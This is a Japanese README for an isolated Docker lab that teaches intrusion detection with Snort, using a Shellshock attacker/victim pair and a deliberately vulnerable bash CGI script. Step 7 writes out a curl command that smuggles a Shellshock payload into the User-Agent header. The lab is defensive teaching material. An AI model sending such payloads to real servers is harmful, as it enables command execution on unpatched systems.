# IDS-Education

## 概要
初学者に向けた簡易的かつ安全なIDS教育環境の構築を可能とする
### 特徴
- WSLを用いており、軽量なsnortによるIDS実験環境である
- 攻撃/被攻撃環境は互い以外の通信を完全に遮断されており、外部への攻撃危険性, 外部からの攻撃危険性が低い
- metasploitを用いた実践的な攻撃の演習、検知実験も可能
- Doclerfileの追記および変更やルールファイルの変更による自由度も高い

## ファイル
### shellshock-lab.tat.gz
#### snort-dockerフォルダの構成
```
snort-docker
├── Dockerfile
├── local.rules
└── snort.conf 
```
#### 内容
- Dockerfile: Dockerを起動するためのファイル。起動時にsnortをインストールする
- local.rules: あらかじめTCP通信,およびshellshockによる攻撃をそれぞれ検知するよう設定されたルールファイル。起動時にsnortのrulesフォルダにコピーされる
- snort.conf: 簡易的なsnortの設定が記述されている
#### shellshockフォルダの構成
```
shellshock
├── attacker
│   └── Dockerfile
├── victim
│   ├── Dockerfile
│   └── cgi-bin
│       └── vulnerable.sh
└── docker-compose.yml
```
#### 内容
- attacker: attacker-msfを起動するDockerfileを格納
    - Dockerfile: 起動時にmetasploitやcurlをインストールする
- victim: victim-shellshockを起動するDockerfile等を格納
    - Dockerfile: 起動時にpython3, bash-4.3をインストールする
    - cgi-bin: cgiスクリプトを格納
        - vulnerable.sh: 脆弱なbashを用いてコマンドを実行
- docker-compose.yml: attacker, victimの二つのコンテナのビルド、連携を定義

## 構築手法
1. WindowsにWSLをインストール
2. Githubからshellshock-lab.tar.gzをダウンロード(Downloadsフォルダにダウンロードしたと仮定)
3. WSLにDockerをインストール
4. tarファイルを解凍 \
    例(WSL内のbash)
    - `cd ~/`
    - `tar -xzvf /mnt/c/Users/[ユーザー名]/Downloads/shellshock-lab.tar.gz`
5. 攻撃用コンテナ、被攻撃用コンテナを起動 \
    例(WSL内のbash)
    - `cd ~/shellshock`
    - `docker-compose build`
    - `docker-compose up -d`
6. 監視用コンテナ\
    例(新しいウィンドウとして開いたWSL内のbash)
    - (新しいWSLウィンドウを開く)
    - `cd ~/snort-docker`
    - `docker build -t monitor-snort .`
    - `docker run -it --rm --network=host --cap-add=NET_ADMIN --cap-add=NET_RAW monitor-snort`
7. 攻撃コンテナの中に入り攻撃を行う \
    例(snortではないの方のWSL内bash)
    - `docker exec -it attacker-msf /bin/bash`
    - (攻撃コンテナの中に入り、bashが起動)
    - `curl -A '() { :;}; echo vulnerable > /tmp/shellshock.txt' http://victim:8000/cgi-bin/vulnerable.sh`
    - (victim内にshellshock.txtが作成され、snortを起動したウィンドウにはTCP packet detected, shellshock deteted のアラートがそれぞれ表示される)
    - `exit`(攻撃コンテナから出てWSLに戻る)
    - `docker exec -it victim-shellshock /bin/bash`
    - (被攻撃コンテナの中に入る)
    - `cat /tmp/shellshock.txt`(vulnerableと出力されればcurlによりファイルが生成されている=攻撃が成功している)

linux環境以外ではブリッジ名の固定が失敗する可能性があり、その場合は snort-docker/Dockerfile の最終行、isolated_netを環境に合わせて変更することが必要